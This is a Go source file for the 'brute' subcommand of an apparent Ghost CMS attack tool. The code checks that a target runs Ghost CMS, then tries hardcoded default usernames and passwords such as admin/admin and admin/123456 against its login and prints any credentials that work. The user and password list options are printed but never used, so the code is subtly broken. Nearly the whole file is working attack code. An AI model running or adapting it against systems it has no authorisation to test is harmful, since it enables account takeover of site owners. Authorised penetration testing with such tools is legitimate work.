package cmd

import (
	"context"
	"fmt"
	"os"
	"time"

	"github.com/fatih/color"
	"github.com/spf13/cobra"
	"github.com/ibrahmsql/ghostscan/pkg/bruteforce"
	"github.com/ibrahmsql/ghostscan/pkg/output"
	"github.com/ibrahmsql/ghostscan/pkg/scanner"
)

var bruteCmd = &cobra.Command{
	Use:   "brute",
	Short: "Execute brute force attacks",
	Long: `Execute brute force attacks against Ghost CMS login endpoints.
This includes admin panel brute forcing, API authentication attacks, and user enumeration.`,
	Run: func(cmd *cobra.Command, args []string) {
		if targetURL == "" {
			color.Red("Error: Target URL is required. Use --url flag.")
			os.Exit(1)
		}
		runBruteForce()
	},
}

func init() {
	rootCmd.AddCommand(bruteCmd)
}

func runBruteForce() {
	// Print banner
	if !noColor {
		output.PrintBanner()
	}
	
	fmt.Printf("[+] Target: %s\n", targetURL)
	fmt.Printf("[+] Threads: %d\n", threads)
	fmt.Printf("[+] Timeout: %ds\n", timeout)
	if userList != "" {
		fmt.Printf("[+] User list: %s\n", userList)
	}
	if passList != "" {
		fmt.Printf("[+] Password list: %s\n", passList)
	}
	fmt.Println()
	
	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout*10)*time.Second)
	defer cancel()
	
	// Initialize scanner first to verify Ghost CMS
	scanner, err := scanner.NewScanner(targetURL, verbose, threads, timeout, userAgent)
	if err != nil {
		color.Red("Error initializing scanner: %v", err)
		os.Exit(1)
	}
	
	// Verify Ghost CMS
	if verbose {
		fmt.Println("[*] Verifying Ghost CMS...")
	}
	scanResult, err := scanner.Scan(ctx)
	if err != nil {
		color.Red("Scan failed: %v", err)
		os.Exit(1)
	}
	
	if !scanResult.IsGhost {
		color.Yellow("[-] Ghost CMS not detected. Brute force may not be effective.")
		if !verbose {
			os.Exit(1)
		}
	}
	
	// Initialize brute forcer
	if verbose {
		fmt.Println("[*] Starting brute force attack...")
	}
	
	// Create brute force config
	config := &bruteforce.Config{
		Threads:   threads,
		Timeout:   time.Duration(timeout) * time.Second,
		UserAgent: userAgent,
		Verbose:   verbose,
	}
	bruteForcer := bruteforce.NewBruteForcer(targetURL, config)
	
	// Get default usernames and passwords
	usernames := []string{"admin", "administrator", "ghost", "user", "test"}
	passwords := []string{"admin", "password", "123456", "ghost", "admin123"}
	
	result, err := bruteForcer.BruteForce(ctx, usernames, passwords)
	if err != nil {
		color.Red("Brute force failed: %v", err)
		os.Exit(1)
	}
	
	// Display results
	if result.Success {
		color.Green("[+] Credentials found!")
		for _, cred := range result.Credentials {
			fmt.Printf("[+] Username: %s\n", cred.Username)
			fmt.Printf("[+] Password: %s\n", cred.Password)
		}
	} else {
		color.Yellow("[-] No valid credentials found")
	}
	
	fmt.Printf("[+] Attempts: %d\n", result.Attempts)
	fmt.Printf("[+] Duration: %v\n", result.Duration)
}